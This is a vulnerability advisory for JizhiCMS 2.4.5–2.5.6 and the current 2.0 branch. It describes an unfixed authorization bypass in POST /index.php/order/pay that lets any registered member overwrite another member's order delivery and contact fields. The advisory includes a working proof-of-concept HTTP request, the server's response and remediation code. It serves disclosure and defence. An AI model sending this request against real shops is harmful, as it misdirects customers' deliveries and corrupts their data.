# JizhiCMS — Authenticated Cross-User Order Tampering via Missing Object-Level Authorization

**Product:** JizhiCMS (极致CMS)
**Vendor:** Langfang Jizhi Network Technology Co., Ltd. (廊坊市极致网络科技有限公司)
**Affected versions:** 2.4.5 through 2.5.6, and branch `2.0` HEAD `ff2c965c26018ae7c3fdb70f180a3b76f40bc3fe` (2026-09-27)
**Vulnerability class:** CWE-639, Authorization Bypass Through User-Controlled Key (IDOR / BOLA)
**Severity:** CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N` = **7.1 High**
**Endpoint:** `POST /index.php/order/pay`
**Status:** reported to the vendor 2026-10-02, no response. **Not fixed upstream as of the latest commit.**

---

## Summary

The front-end order submission endpoint `POST /index.php/order/pay` looks up the order only by the client-supplied `orderno` and then updates it by primary key. The lookup is never bound to the authenticated member, so any registered front-end member can overwrite the delivery and contact fields of any other member's order.

Affected fields: `receive_username`, `receive_tel`, `receive_email`, `receive_address`, along with process fields such as `paytype` and the submit state. The victim order's `userid` is unchanged, so the record is modified in place rather than transferred.

Two conditions make this reachable in a default install. Front-end registration is on by default (`jz_sysconfig.isregister = 1`), so an attacker can create the account they need. Order numbers are `'No' . date('YmdHis')`, a second-resolution timestamp with no random part, so the key can be enumerated.

## Root cause

`app/home/c/OrderController.php`, method `pay()` (lines 139–184):

```php
// line 153 - lookup constrained only by the client-supplied order number
$order = M('orders')->find(['orderno' => $w['orderno']]);

// line 184 - update by primary key
$res = M('orders')->update(['id' => $order['id']], $w);
```

`_init()` only checks that a member is logged in. There is no object-level authorization check:

```php
function _init(){
    parent::_init();
    if(!$this->islogin){
        // ... reject anonymous callers only
    }
}
```

Other endpoints in the same controller family do add the owner to the lookup, which shows the check was simply missed here:

| Endpoint | File:line | Lookup |
|---|---|---|
| `/user/orderdetails` | `UserController.php:262` | `find(['orderno'=>$orderno,'userid'=>$this->member['id']])` |
| `/user/payment` | `UserController.php:309` | `find(['orderno'=>$orderno,'userid'=>$this->member['id']])` |
| `/user/orderdel` | `UserController.php:374` | `find(" orderno='".$orderno."' and userid=".$this->member['id']." ...")` |
| **`/order/pay`** | **`OrderController.php:153`** | **`find(['orderno'=>$w['orderno']])`, no owner constraint** |

## Affected versions

Verified by inspecting the file at each tag. The vulnerable lookup is present in all of them:

| Tag | `OrderController.php` line | Vulnerable |
|---|---|---|
| `v2.4.5` | 144 | **Yes** |
| `v2.5.3` | 153 | **Yes** |
| `v2.5.4` | 153 | **Yes** |
| `v2.5.5` | 153 | **Yes** |
| `v2.5.6` | 153 | **Yes** |
| branch `2.0` HEAD `ff2c965` (2026-09-27) | 153 | **Yes** |

Versions before 2.4.5 were not exhaustively verified, so the lower bound is claimed only as far back as was actually inspected.

The issue is not fixed upstream. The audited tree is the current development tip: the GitHub default branch `2.0` HEAD resolves to `ff2c965c26018ae7c3fdb70f180a3b76f40bc3fe` (committed 2026-09-27, message `安全优化`), identical to the commit audited here. The repository is active and not archived (`pushed_at: 2026-09-27T14:37:11Z`, `archived: false`).

## Default installations are affected

The member, cart and order module ships in the core distribution archive, not as an optional plugin. The official package the official package `http://down.jizhicms.cn/jizhicms.zip` (20,198,797 bytes, 630 entries, fetched 2026-10-02) shows it bundles:

- `app/home/c/OrderController.php`, `app/home/c/UserController.php`
- `app/home/c/MypayController.php`, `app/home/c/JzpayController.php`
- `static/cms/user/cart.html`, `buy.html`, `buy-list.html`, `buy-view.html`
- `app/admin/c/OrderController.php`, `MemberController.php` and member-group templates

## Preconditions

1. A front-end member account. Registration is open by default (`jz_sysconfig.isregister = 1`), so the attacker registers their own.
2. A target `orderno`. Generated as `'No' . date('YmdHis')`: second resolution, no random suffix. Guessable for a known or inferred ordering window, and enumerable on a busy storefront.
3. The target order exists and is unpaid.

## Proof of concept

Attacker (member B) submits the victim's (member A) order number:

```http
POST /index.php/order/pay HTTP/1.1
Host: <target>
Cookie: PHPSESSID=<member B session>
Content-Type: application/x-www-form-urlencoded

go=1&orderno=No20261001232525&username=ATTACKER-MARKER&tel=18800000000&email=poc%40example.test&address=ATTACKER-ADDRESS&paytype=1&ajax=1
```

Server response:

```json
{"code":0,"msg":"我们已经收到您的订单，我们会尽快给你发货，请密切关注您的邮箱以获得订单的最新消息，谢谢合作！","url":"http://<target>/user/orders.html"}
```

Resulting database row. The victim's delivery fields are replaced while `userid` still belongs to member A:

```
id  orderno                userid  receive_username  receive_tel   receive_email      receive_address
1   No20261001232525       1 (A)   ATTACKER-MARKER   18800000000   poc@example.test   ATTACKER-ADDRESS
```

The endpoint redirects to `user/orders.html` and does not echo the victim's data, so the overwrite is not visible in the HTTP response. Verification requires reading the database row.

Scripts:

- [`poc/order_pay_cross_user_idor.py`](poc/order_pay_cross_user_idor.py): reproduces the overwrite with two self-created accounts
- [`poc/verify_f01_independent.py`](poc/verify_f01_independent.py): independent verifier

Raw captures are in [`evidence/`](evidence/): HTTP transcripts of two independent runs plus the resulting order rows. The lab host address has been sanitized.

## Impact

An authenticated member controls the recipient name, phone number, e-mail address and shipping address of any other member's order, and can set process fields such as `paytype` from the request. In practice this allows delivery misdirection, corrupted fulfilment records and loss of the customer's correct contact data.

Confidentiality impact is limited to an existence oracle: the success and failure responses reveal whether a given order number exists.

## Remediation

Bind the lookup to the session owner:

```php
$order = M('orders')->find([
    'orderno' => $w['orderno'],
    'userid'  => $this->member['id'],
]);
```

Apply the same constraint to every order operation that changes state. Also replace `'No' . date('YmdHis')` with a random identifier, validate modifiable fields and order state server-side, and add a negative test where member B submits member A's `orderno` and the row must not change.

## Disclosure timeline

| Date (Asia/Shanghai) | Event |
|---|---|
| 2026-10-01 | Identified during static review of the `v2.5.6` source tree |
| 2026-10-01 23:25 | First dynamic reproduction on an isolated, self-owned lab instance |
| 2026-10-02 | Second independent reproduction; evidence captured and hashed; lab reset and verified clean |
| 2026-10-02 | Duplicate check across NVD, OpenCVE, VulDB, CNVD, Exploit-DB and the upstream issue tracker |
| 2026-10-02 | Upstream re-checked, branch `2.0` HEAD `ff2c965` is still vulnerable |
| 2026-10-02 | Vendor notified via the security contacts published in `SECURITY.md` (`ttuuffuu@163.com`, `2581047041@qq.com`) |
| 2026-10-02 | CVE requested |
| _pending_ | Vendor fix / public advisory |

## Duplicate check

Checked 2026-10-01 … 2026-10-02 across NVD/CVE, OpenCVE (vendor `jizhicms`, **40 published CVEs**), VulDB, CNVD, Exploit-DB, and public GitHub issues/code history.

No public duplicate was found for this product + this endpoint + this root cause. The published JizhiCMS CVE corpus covers SQL injection, XSS, SSRF, CSRF, arbitrary file upload/download and one improper-authorization issue in `/user/release.html` (`ishot`, CVE-2025-2638, ≤ 1.7.0). **None covers `order/pay` or cross-user order ownership.**

Caveat: private reports, non-public CNVD queues and reserved CVE/VDB entries cannot be fully excluded. This is "no public duplicate found", not a guarantee of uniqueness.

## Scope

All testing was done against an isolated lab instance owned by the reporter, using self-created member accounts and a self-created order. No production system, no real user data and no payment provider was involved. The scripts in `poc/` are parameterized and need credentials supplied by the operator.

## References

- Vendor source repository: https://github.com/Cherry-toto/jizhicms
- Vendor product site: https://www.jizhicms.cn/
- Official distribution archive: http://down.jizhicms.cn/jizhicms.zip

## Credits

Reported by riyuedeqi. Source review, dynamic verification and disclosure package prepared with 海鸥 (technical operator).
